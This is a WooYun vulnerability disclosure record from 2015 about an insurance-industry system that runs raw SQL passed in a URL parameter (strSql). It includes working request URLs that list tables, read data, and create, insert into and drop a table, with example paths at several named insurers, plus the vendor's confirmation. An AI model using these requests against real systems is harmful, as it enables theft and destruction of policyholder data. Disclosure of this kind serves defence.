{"id": 84886, "wybug_id": "wooyun-2015-0157676", "wybug_title": "某保险行业通用系统设计缺陷可直接操作数据库获取敏感数据续（影响众多人寿保险）", "wybug_corp": "中科软科技", "wybug_author": "我的邻居王婆婆", "wybug_date": "2015-12-02 18:25", "wybug_open_date": "2016-03-03 09:24", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-03：\t细节向公众公开  简要描述： 设计缺陷，增删改查 详细说明：  http://**.**.**.**/bugs/wooyun-2010-0120530续（注意，页面不同）说一下我的发现过程以国华人寿为例在访问国华人寿寿险业务系统http://**.**.**.**/indexlis.jsp时\n\n系统加载了一个js\nhttp://**.**.**.**/common/easyQueryVer3/EasyQueryVer3.js\n其中有一段代码这么写\n\n\n//urlStr：查询窗口URL和查询参数\tvar urlStr = \"../common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=\" + strSql + \"&strStart=\" + strStart + \"&LargeFlag=\" + LargeFlag;\t//sFeatures：查询窗口样式\tvar sFeatures = \"status:no;help:0;close:0;dialogWidth:0px;dialogHeight:0px;resizable=1\";\tvar strQueryResult = \"\";\t//查询结果字符串\tvar arrQueryResult = new Array();\t//查询结果数组\tvar sqlCacheFlag = false;\t//检查缓存，缓存存在，返回数据，不存在返回FALSE，则SQL语句无重复，需要进行查询\n从中我们得到了一个url\nhttp://**.**.**.**/common/easyQueryVer3/EasyQueryVer3Window.jsp\n构造参数查询当前数据库中行数大于500000的表名\nhttp://**.**.**.**/common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=select+TABLE_NAME,NUM_ROWS+from+tabs+where+NUM_ROWS+>+500000 &strStart=1&LargeFlag=0\n尝试访问\n\n系统会提示什么关闭页面，我们无视，点否\n\n空白的页面下隐藏着我们要的数据请查看源代码，或看请求数据包\n\n查询结果会返回4次分别在window.opener.transferQueryResultwindow.opener.afterEasyQueryVer3window.returnValuestrQueryResult好怪的设计，值是一模一样的看数据量大一些的表NUM_ROWS>5000000\nhttp://**.**.**.**/common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=select+TABLE_NAME,NUM_ROWS+from+tabs+where+NUM_ROWS+>+5000000 &strStart=1&LargeFlag=0\n\n\n无语凝噎，数据量果然很大LCCONTPLANDUTYPARAM 4亿多行，存什么呢LBCONT-19298087取前10行\n\n好多数据，不一一看表了，做人寿的不能以常理视之直接传sql意味着我们可以直接增删改增表wooyun\ncreate table wooyun(id number(11) not null)\n\n\n插表wooyun\ninsert into wooyun(id) values(1)\n\n\n见证奇迹\nselect * from wooyun\n\n\n返回值有4处，1、1对应删表wooyun\ndrop table wooyun\n\n\n再查wooyun\nselect * from wooyun\n\n\n这要是把裤子删了，没备份就可以跪了   漏洞证明：  其它案例：华夏人寿http://**.**.**.**/ui/common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=select+TABLE_NAME,NUM_ROWS+from+tabs&strStart=1&LargeFlag=0\n\n\n\n江泰保险\nhttp://**.**.**.**:7001/ui/common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=select+TABLE_NAME,NUM_ROWS+from+tabs&strStart=1&LargeFlag=0\n\n\n\n\n泛华保险\nhttp://**.**.**.**/common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=select+TABLE_NAME,NUM_ROWS+from+tabs&strStart=1&LargeFlag=0\n\n\n\n\n中荷人寿\n**.**.**.**:8443/cusQuery/common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=select+TABLE_NAME,NUM_ROWS+from+tabs&strStart=1&LargeFlag=0\n\n\n\n\n君龙人寿\nhttp://**.**.**.**:8080/kdlins/common/easyQueryVer3/EasyQueryVer3Window.jsp?strSql=select+TABLE_NAME,NUM_ROWS+from+tabs&strStart=1&LargeFlag=0\n\n\n\n\n细节不可忽略   修复方案：  补丁   版权声明：转载请注明来源 我的邻居王婆婆@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-12-04 16:09 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置；同时转由CNCERT向保险行业信息化主管部门通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}